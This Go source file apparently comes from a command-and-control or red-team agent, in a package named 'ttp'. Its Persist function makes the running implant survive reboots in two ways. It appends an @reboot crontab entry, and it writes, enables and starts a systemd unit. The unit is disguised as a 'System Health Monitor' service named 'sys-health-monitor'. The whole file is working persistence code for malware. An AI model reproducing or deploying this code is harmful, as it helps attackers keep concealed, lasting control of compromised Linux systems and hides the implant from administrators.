package ttp

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// Persist installs the agent as a persistent service.
// method: "cron", "systemd", or "all"
func Persist(method string) (string, error) {
	self, err := os.Executable()
	if err != nil {
		return "", fmt.Errorf("executable: %w", err)
	}
	self, _ = filepath.EvalSymlinks(self)

	// Reconstruct flags from /proc/self/cmdline
	cmdlineBytes, _ := os.ReadFile("/proc/self/cmdline")
	args := strings.Split(strings.TrimRight(string(cmdlineBytes), "\x00"), "\x00")
	extraArgs := ""
	if len(args) > 1 {
		extraArgs = strings.Join(args[1:], " ")
	}

	var results []string

	if method == "cron" || method == "all" {
		r, err := installCron(self, extraArgs)
		if err != nil {
			results = append(results, fmt.Sprintf("cron: failed: %v", err))
		} else {
			results = append(results, r)
		}
	}

	if method == "systemd" || method == "all" {
		r, err := installSystemd(self, extraArgs)
		if err != nil {
			results = append(results, fmt.Sprintf("systemd: failed: %v", err))
		} else {
			results = append(results, r)
		}
	}

	return strings.Join(results, "\n"), nil
}

func installCron(binPath, extraArgs string) (string, error) {
	entry := fmt.Sprintf("@reboot %s %s >/dev/null 2>&1", binPath, extraArgs)
	cmd := exec.Command("sh", "-c",
		fmt.Sprintf(`(crontab -l 2>/dev/null; echo %q) | crontab -`, entry))
	if out, err := cmd.CombinedOutput(); err != nil {
		return "", fmt.Errorf("%v: %s", err, out)
	}
	return fmt.Sprintf("cron: @reboot entry installed for %s", binPath), nil
}

func installSystemd(binPath, extraArgs string) (string, error) {
	const svcName = "sys-health-monitor"
	unit := fmt.Sprintf(`[Unit]
Description=System Health Monitor
After=network.target

[Service]
Type=simple
ExecStart=%s %s
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
`, binPath, extraArgs)

	unitPath := fmt.Sprintf("/etc/systemd/system/%s.service", svcName)
	if err := os.WriteFile(unitPath, []byte(unit), 0644); err != nil {
		return "", fmt.Errorf("write unit: %w", err)
	}
	exec.Command("systemctl", "daemon-reload").Run()
	exec.Command("systemctl", "enable", svcName).Run()
	exec.Command("systemctl", "start", svcName).Run()

	return fmt.Sprintf("systemd: %s.service installed and started", svcName), nil
}
